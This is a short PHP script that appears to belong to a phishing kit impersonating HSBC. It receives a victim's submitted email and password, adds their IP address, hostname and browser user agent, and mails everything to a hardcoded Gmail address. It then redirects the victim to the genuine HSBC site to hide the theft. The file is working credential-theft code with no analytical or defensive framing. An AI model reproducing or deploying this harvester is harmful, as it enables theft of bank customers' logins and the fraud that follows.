<?php

extract($_POST);

if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| PDF L0GS |--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Passcode              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- PDF L0GS --------------|\n";
$send = "ujunwastephen8@gmail.com";
$subject = "Login :PDF L0GS | $ip";
{ 
mail("ujunwastephen8@gmail.com", $send, $subject, $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://us.hsbc.com");
}else{
header ("Location: https://us.hsbc.com");
}

?>